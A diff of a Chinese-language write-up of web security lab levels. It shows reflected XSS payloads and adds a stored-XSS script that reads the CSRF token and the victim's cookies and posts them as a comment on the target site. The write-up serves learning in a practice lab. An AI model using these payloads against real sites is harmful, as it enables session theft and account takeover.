@@ -79,7 +79,7 @@
          3. `onclick='alert(1)`：新增 onclick 事件，点击这个元素就弹框
          4.`accesskey` 是 HTML 全局属性：给元素绑定一个键盘快捷键，在 Chrome 里按下对应快捷键，就会**聚焦这个元素，并且触发它的 onclick 事件**。
 
-关卡十五：Reflected XSS into HTML context with most tags and attributes blocked【反射型，大部分标签被拦截】
+##关卡十五：Reflected XSS into HTML context with most tags and attributes blocked【反射型，大部分标签被拦截】
 **攻击payload**:<iframe src="靶场URL?search=<body onresize=print()>" onload="this.style.width='100px' "></iframe>
 **原理**：1.同上关卡六描述
           2.拦截了大部分标签但是不可能没有一个可用，采用BP攻击模块进行自动化筛选'<body>'可用
@@ -115,6 +115,36 @@ function handleResponse() {
           9.changeReq.open('post', '/my-account/change-email', true);用post访问
           10. changeReq.send('csrf='+token+'&email=test@test.com')将之前拿到的csrf塞进去，加上自己的邮箱
 
+##关卡十六：Exploiting cross-site scripting to steal cookies【steal password】
+**攻击payload**:
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const csrf_token = document.querySelector('input[name="csrf"]').value;
+    let cookie_t = document.cookie;
+    fetch("/post/comment", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `csrf=${csrf_token}&postId=9&comment=${cookie_t}&name=Hacked&email=test%40test.com&website=https%3A%2F%2Ftest.com`
+    });
+});
+</script>
+**原理**：1.<script></script>script标签，告诉浏览器按代码执行
+          2.document.addEventListener("DOMContentLoaded", () =>等浏览器执行好HTML之后去执行代码【看准时机】
+          3.const csrf_token = document.querySelector('input[name="csrf"]').value;找到csrf，将token拿出来放到csrf_token中
+          4.let cookie_t = document.cookie;将登录凭证都放到cookie_t里
+          5. fetch("/post/comment"，{ 使用fetch向自己发送评论的接口发送请求【内部突破】
+          6. method: "POST",
+             headers: { "Content-Type": "application/x-www-form-urlencoded" },
+             【专业人士请放行】
+          7. body: `csrf=${csrf_token}&postId=9&comment=${cookie_t}&name=Hacked&email=test%40test.com&website=https%3A%2F%2Ftest.com`【组合式】
+             csrf=${csrf_token}拿下刚刚的凭证
+             postId=9放到id为9的地点，具体看靶场URL【位置地点】
+             comment=${cookie_t}【将密码贴到大屏上】
+             name=Hacked&email=test%40test.com&website=https%3A%2F%2Ftest.com发论坛需要name,email,website,格式必有
+
+##总结：进不去内网，外部通讯失效，从旁系入手，一个不起眼的管理员权限也不小
+             
+          
 
 
 
